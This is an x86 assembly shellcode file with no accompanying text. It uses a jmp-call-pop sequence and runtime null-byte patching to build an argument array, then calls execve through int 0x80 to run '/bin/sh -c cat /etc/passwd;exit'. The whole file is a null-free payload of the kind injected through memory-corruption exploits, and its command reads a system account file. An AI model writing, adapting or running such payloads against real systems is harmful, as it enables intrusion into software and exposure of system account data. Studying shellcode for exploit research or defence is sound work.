	 bits 32
 	 nop
 	 nop
start: 	 jmp short codeEnd
start2:  pop esi
	 xor eax,eax
	 mov [byte esi+flagStr-exeStr-2],al 		; move one null byte to end of bin/sh
	 mov [byte esi+cmdStr-exeStr-1],al		; move one null byte to end of -c
	 mov [byte esi+arrayAddr-exeStr-1],al	; move one null byte to end of shell command
	 mov [byte esi+arrayAddr-exeStr+12],eax	; move null word to end of array
	 mov [byte esi+arrayAddr-exeStr],esi	; stores exeStr
	 lea edi,[byte esi+flagStr-exeStr]	; stores the address of '-c'
	 mov [byte esi+arrayAddr-exeStr+4],edi
	 lea edi,[byte esi+cmdStr-exeStr]	
	 mov [byte esi+arrayAddr-exeStr+8],edi
	 mov al,0x0b
	 mov ebx, esi
	 lea ecx, [byte esi+arrayAddr-exeStr]
	 xor edx,edx
	 int 0x80
codeEnd: call start2
exeStr:	 db "/bin/shXy"
flagStr	 db "-cX"
cmdStr	 db "cat /etc/passwd;exitX"
arrayAddr: dd 0xffffffff
	   dd 0xffffffff
	   dd 0xffffffff
	   dd 0xffffffff
newAddr:   dd newAddr-start	
